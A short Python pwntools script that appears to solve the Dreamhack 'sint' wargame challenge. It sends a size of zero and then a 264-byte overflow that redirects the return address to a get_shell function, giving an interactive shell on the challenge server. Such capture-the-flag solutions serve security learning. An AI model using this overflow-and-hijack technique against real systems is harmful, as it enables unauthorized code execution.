from pwn import *

p = process("./sint")
p = remote("host3.dreamhack.games", 14727)
e = ELF("./sint")

get_shell_addr = e.symbols['get_shell']

#payload = b"A"*0x164
payload = b"A"*256
payload += b"B"*4
payload += b"C"*4
payload += p32(get_shell_addr)

p.sendlineafter(b"Size: ", b"0")
p.sendlineafter(b"Data: ", payload)
p.interactive()
